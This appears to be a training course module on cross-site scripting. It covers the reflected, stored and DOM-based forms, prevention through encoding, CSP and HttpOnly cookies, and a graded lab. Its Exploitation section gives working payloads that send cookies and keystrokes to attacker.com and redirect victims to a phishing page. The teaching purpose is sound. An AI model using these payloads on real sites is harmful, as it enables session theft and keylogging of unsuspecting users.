# Module 3 — Cross-Site Scripting (XSS)

**Course:** Web Application Security | **Path:** Web App Security (3 of 10)

---

## What You'll Actually Do

You'll find and exploit XSS vulnerabilities, then fix them. Understanding the attack is how you prevent it.

---

## Types of XSS

**Reflected XSS:**
```text
URL: https://example.com/search?q=<script>alert('XSS')</script>
If the server reflects the query in the page without encoding:
<h1>Results for: <script>alert('XSS')</script></h1>
```

**Stored XSS:**
```text
Attacker submits a comment containing <script>steal_cookies()</script>
Stored in database
Every user who views the comment executes the script
```

**DOM-based XSS:**
```javascript
// Client-side code reads from URL and writes to DOM
document.getElementById("output").innerHTML = location.hash.slice(1);
// URL: https://example.com#<img src=x onerror=alert('XSS')>
```

---

## Exploitation

```javascript
// Steal cookies
<script>
new Image().src="https://attacker.com/steal?cookie="+document.cookie;
</script>

// Redirect to phishing page
<script>
window.location="https://attacker.com/login?ref="+document.domain;
</script>

// Keylogger
<script>
document.onkeypress=function(e){
  fetch("https://attacker.com/log?key="+e.key);
}
</script>
```

---

## Prevention

**Output encoding:**
```javascript
// HTML context
element.textContent = userInput;  // Safe

// Attribute context
element.setAttribute("data-value", encodeURIComponent(userInput));

// JavaScript context
var safe = JSON.stringify(userInput);
```

**Content Security Policy:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
```

**HttpOnly cookies:**
```text
Set-Cookie: session=xyz; HttpOnly; Secure
// JavaScript can't access document.cookie
```

---

## Assessment

**Lab task (20 min):**

1. Find reflected XSS in a test application
2. Find stored XSS in a comment field
3. Exploit DOM-based XSS
4. Write payloads that demonstrate impact
5. Fix each vulnerability

**Grading:**
- Reflected XSS found: 20%
- Stored XSS found: 20%
- DOM XSS found: 20%
- Impact demonstrated: 15%
- Fixes correct: 25%

---

## Evidence

- **OutcomeEvidence:** `WAS-LO3 — Cross-Site Scripting`
